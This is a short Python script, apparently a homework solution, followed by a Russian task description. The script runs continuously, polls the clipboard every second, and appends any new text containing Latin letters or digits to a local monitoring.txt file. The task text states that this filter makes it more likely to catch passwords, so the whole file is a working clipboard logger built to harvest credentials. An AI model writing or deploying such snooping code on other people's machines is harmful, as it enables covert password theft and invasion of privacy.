import re
import pyperclip
import time


old = ''

while True:
    # Содержимое буфера
    buff = pyperclip.paste()
    if(buff != old):
        # Открываем файл для записи
        with open('les_2\dz_2_files\monitoring.txt', 'a', encoding='UTF-8') as file:
            # Регулярное выражение. С его помощью проверяются символы
            if(re.search(r'[a-zA-Z0-9]', buff)):
                file.write(str(buff) + "\n")
                print(str(buff) + "\n")

        old = buff

    time.sleep(1)

'''
Напиши программу, которая постоянно запущена и периодически 
получает содержимое буфера обмена. Если оно изменилось, 
то дописывает его в конец файла monitoring.txt. Попробуй 
записывать в лог только те перехваченные строки, в которых 
есть латинские буквы и цифры, так более вероятно поймать пароли.
'''